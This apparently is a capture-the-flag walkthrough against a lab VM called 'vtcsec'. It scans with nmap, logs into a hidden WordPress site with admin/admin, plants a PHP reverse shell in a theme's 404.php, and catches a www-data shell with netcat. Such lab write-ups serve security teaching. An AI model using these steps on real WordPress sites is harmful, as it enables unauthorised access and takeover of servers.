###Find own IP/Network

    ifconfig

>eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.131  netmask 255.255.255.0  broadcast 192.168.30.255

###Scan Network


    nmap 192.168.30.0/24
    
    >Nmap scan report for 192.168.30.128
Host is up (0.00072s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:04:64:FF (VMware)

    
###Add host to hosts file for convenience

    echo 192.168.30.128 vtcsec >> /etc/hosts
    
    
###Enumerate HTTP

    nmap --script=http-enum vtcsec
  
  
  
>Nmap scan report for vtcsec (192.168.30.128)
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /secret/: Potentially interesting folder
MAC Address: 00:0C:29:04:64:FF (VMware)

###The wordpress site

Navigate to:
    
    vtcsec/secret
    
This is found to be a wordpress site. Try the default login page wp-login.php to see if it works

    vtcsec/secret/wp-login.php
    
 Login Page Found

Test Default Password

    Login: admin
    Pass: admin
    

###Upload Reverse shell script

Check themes, what is currently active?

    Appearance > Themes
    
Edit a 404.php page

    Appearance > editor > (select a non active theme. here I use twentysixteen) > 404 template(404.php)
    
Copy and paste Pentestmonkey PHP Reverse Shell script. (Don't forget to set the local port and ip! Here I use port 7777)
    
    (Modify this stuff)
    $ip = '192.168.30.131'; //CHANGE THIS
    $port = '7777'; //CHANGE THIS


###Set up listener

    nc -lvp 7777
    
###Open page and load the 404.php

    (open in browser) vtcsec/secret/wp-content/themes/twentysixteen/404.php
    
    or
    
    curl vtcsec/secret/wp-content/themes/twentysixteen/404.php
    
Reverse shell received
    
    >root@kali:~# nc -lvp 7777
listening on [any] 7777 ...
connect to [192.168.30.131] from vtcsec [192.168.30.128] 57100
Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:37:43 up 50 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
    
    
    
